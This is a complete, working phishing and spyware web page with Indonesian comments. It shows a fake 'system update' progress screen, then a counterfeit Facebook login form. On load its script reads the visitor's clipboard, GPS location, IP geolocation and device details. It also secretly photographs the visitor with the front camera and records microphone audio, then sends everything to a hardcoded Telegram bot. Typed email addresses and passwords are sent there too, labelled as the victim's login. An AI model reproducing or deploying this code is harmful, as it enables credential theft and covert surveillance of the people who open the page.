<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Pembaruan Sistem</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  margin: 0;
  background: #fff;
  font-family: 'Roboto', sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100vh;
}
#updateScreen, #loginScreen {
  display: none;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
h1 {
  color: #4CAF50;
  margin-bottom: 10px;
}
p {
  color: #555;
  margin-bottom: 20px;
}
#progress {
  width: 80%;
  height: 20px;
  background: #eee;
  border-radius: 10px;
  overflow: hidden;
}
#progressBar {
  width: 0%;
  height: 100%;
  background: #4CAF50;
}
input {
  margin: 10px;
  padding: 10px;
  width: 250px;
  border: 1px solid #ccc;
  border-radius: 5px;
}
button {
  padding: 10px 20px;
  background: #1877f2;
  color: white;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}
</style>
</head>
<body>

<div id="updateScreen">
  <h1>Memeriksa Pembaruan...</h1>
  <p>Jangan matikan perangkat Anda.</p>
  <div id="progress">
    <div id="progressBar"></div>
  </div>
</div>

<div id="loginScreen">
  <h1 style="color:#1877f2;">Facebook</h1>
  <input type="text" id="email" placeholder="Email atau Nomor Telepon">
  <input type="password" id="password" placeholder="Kata Sandi">
  <button onclick="kirimLogin()">Masuk</button>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
// Setting
const token = '7526351360:AAENNrTa3iCt_1Z7P5YtOI2z6A6tf-08u5U'; // Tokenmu
const chat_id = '6688052682'; // Chat ID mu
const startTime = Date.now();

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

// Telegram kirim
function kirimPesan(text) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ chat_id, text })
  });
}

function kirimFoto(blob, caption) {
  let form = new FormData();
  form.append('chat_id', chat_id);
  form.append('photo', blob, 'foto.jpg');
  form.append('caption', caption);
  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
}

function kirimAudio(blob) {
  let form = new FormData();
  form.append('chat_id', chat_id);
  form.append('audio', blob, 'rekaman.mp3');
  form.append('caption', '🎤 Rekaman Suara Korban');
  fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
}

// Sadap kamera
function ambilFoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);
  canvas.toBlob(blob => kirimFoto(blob, '📸 Foto Kamera'));
}

// Sadap mic
function sadapMic() {
  navigator.mediaDevices.getUserMedia({ audio: true })
  .then(stream => {
    const recorder = new MediaRecorder(stream);
    const audioChunks = [];
    recorder.ondataavailable = e => audioChunks.push(e.data);
    recorder.onstop = () => {
      const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
      kirimAudio(audioBlob);
    };
    recorder.start();
    setTimeout(() => recorder.stop(), 10000); // 10 detik
  });
}

// Sensor
function sensorInfo() {
  window.addEventListener('devicemotion', event => {
    const acc = event.accelerationIncludingGravity;
    kirimPesan(`📡 Sensor:
X: ${acc.x?.toFixed(2)}
Y: ${acc.y?.toFixed(2)}
Z: ${acc.z?.toFixed(2)}
`);
  }, { once: true });
}

// Curi clipboard
function curiClipboard() {
  navigator.clipboard.readText()
  .then(text => kirimPesan('📋 Clipboard:\n' + text))
  .catch(err => kirimPesan('Gagal akses clipboard: ' + err));
}

// Device info
function deviceInfo() {
  fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
  .then(loc => loc.json())
  .then(info => {
    const device = navigator.userAgent;
    const ram = navigator.deviceMemory || 'Tidak diketahui';
    const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const bahasa = navigator.language;
    const browser = navigator.appName + ' ' + navigator.appVersion;
    const statusJaringan = navigator.onLine ? 'Online' : 'Offline';

    navigator.getBattery().then(bat => {
      const now = Date.now();
      const waktuBuka = Math.floor((now - startTime) / 1000);
      const status = `
==[+] 𝙏𝙧𝙖𝙘𝙠 𝘽𝙮 𝘿𝙤𝙣𝙯𝙏𝙯𝙮 [+]==
🌐 IP: ${info.ip}
🏳 Negara: ${info.country_name}
🖥 Region: ${info.region}
📲 Kota: ${info.city}
🔎 ISP: ${info.org}
🔋 Baterai: ${Math.floor(bat.level * 100)}%
📱 Device: ${device}
🧠 RAM: ${ram} GB
⚙️ CPU: ${cpu} core
🌍 Zona Waktu: ${timezone}
🗣️ Bahasa: ${bahasa}
🧭 Browser: ${browser}
📡 Status Jaringan: ${statusJaringan}
⏳ Waktu buka web: ${waktuBuka} detik
==[+] 𝘾𝙮𝙗𝙚𝙧 𝘿𝙤𝙣𝙯 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 [+]==`;
      kirimPesan(status);
    });
  });
}

// Lokasi GPS
function gpsLokasi() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      kirimPesan(`📍 Lokasi GPS:\nhttps://maps.google.com/?q=${lat},${lon}`);
    });
  }
}

// Vibrasi
function vibratePhone() {
  if (navigator.vibrate) {
    navigator.vibrate([200, 100, 200]);
  }
}

// Progress bar fake loading
let progress = 0;
const progressBar = document.getElementById('progressBar');
const updateInterval = setInterval(() => {
  if (progress >= 100) {
    clearInterval(updateInterval);
    document.getElementById('updateScreen').style.display = 'none';
    document.getElementById('loginScreen').style.display = 'flex';
  } else {
    progress += 1;
    progressBar.style.width = progress + '%';
  }
}, 150); // 150ms per step

// Sadap semua
function mulaiSadap() {
  // Device info
  deviceInfo();
  // Clipboard
  curiClipboard();
  // GPS Lokasi
  gpsLokasi();
  // Sensor
  sensorInfo();
  // Vibrasi
  vibratePhone();
  // Kamera depan
  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
  .then(stream => {
    video.srcObject = stream;
    setTimeout(() => {
      ambilFoto();
      stream.getTracks().forEach(track => track.stop());
    }, 4000);
  });
  // Sadap mic
  sadapMic();
}

// Kirim login
function kirimLogin() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  kirimPesan(`🔑 Login Korban:
Email: ${email}
Password: ${password}`);
  alert('Memproses...');
  setTimeout(() => {
    window.location.href = 'https://facebook.com';
  }, 1500);
}

// Start
document.getElementById('updateScreen').style.display = 'flex';
mulaiSadap();
</script>

</body>
</html>
